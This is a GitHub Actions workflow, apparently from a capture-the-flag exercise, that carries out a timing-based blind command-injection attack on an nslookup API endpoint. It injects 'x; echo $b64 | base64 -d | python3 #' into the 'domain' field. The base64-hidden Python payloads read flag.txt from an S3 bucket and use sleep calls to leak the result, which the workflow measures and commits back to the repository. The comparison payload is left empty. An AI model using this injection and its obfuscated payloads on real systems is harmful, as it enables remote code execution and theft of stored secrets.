name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          token: ${{ github.token }}

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Calibrate and verify flag
        run: |
          # Calibration scripts - sleep(0): measures raw overhead, sleep(4): known baseline
          B64_CAL0="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCgwKQ=="
          B64_CAL4="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCg0KQ=="
          B64_CAL8="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCg4KQ=="
          # Full flag comparison: sleep(10) if correct, sleep(2) if wrong
          B64_CMP=""

          touch calibrate.txt

          run_timed() {
            local name="$1" b64="$2"
            INJECT="x; echo $b64 | base64 -d | python3 #"
            python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
            START=$(date +%s%N)
            curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
              -H "Content-Type: application/json" -d @payload.json
            END=$(date +%s%N)
            MS=$(( (END - START) / 1000000 ))
            echo "$name ${MS}ms" | tee -a calibrate.txt
          }

          run_timed "cal_sleep0" "$B64_CAL0"
          run_timed "cal_sleep4" "$B64_CAL4"
          run_timed "cal_sleep8" "$B64_CAL8"
          run_timed "full_flag_cmp" "$B64_CMP"
          run_timed "cal_sleep0_2" "$B64_CAL0"
          run_timed "cal_sleep4_2" "$B64_CAL4"

          echo "=== CALIBRATION RESULTS ==="
          cat calibrate.txt
          python3 << 'EOF'
with open('calibrate.txt') as f:
    lines = [l.strip() for l in f if l.strip()]
data = {}
for l in lines:
    name, ms = l.rsplit(' ', 1)
    data[name] = int(ms.rstrip('ms'))

# Estimate overhead from sleep(0) calls
overhead = (data.get('cal_sleep0',0) + data.get('cal_sleep0_2',0)) / 2
print(f"Estimated overhead (S3+network): {overhead:.0f}ms")

cal4 = (data.get('cal_sleep4',0) + data.get('cal_sleep4_2',0)) / 2
print(f"Calibrated sleep(4): {cal4:.0f}ms → actual overhead: {cal4-4000:.0f}ms")

cmp_ms = data.get('full_flag_cmp', 0)
print(f"Full flag comparison: {cmp_ms}ms")

adj_cmp = cmp_ms - overhead
print(f"Adjusted comparison (subtract overhead): {adj_cmp:.0f}ms")
if adj_cmp > 8000:
    print(">>> FLAG CORRECT (sleep≈10s)")
elif adj_cmp > 5000:
    print(">>> AMBIGUOUS")
else:
    print(">>> FLAG WRONG (sleep≈2s)")
EOF

      - name: Commit calibration results
        run: |
          git config user.email "bot@github-actions"
          git config user.name "GitHub Actions"
          git add calibrate.txt
          git commit -m "calibration + flag verify results [skip ci]" || echo "Nothing to commit"
          git push origin corgi
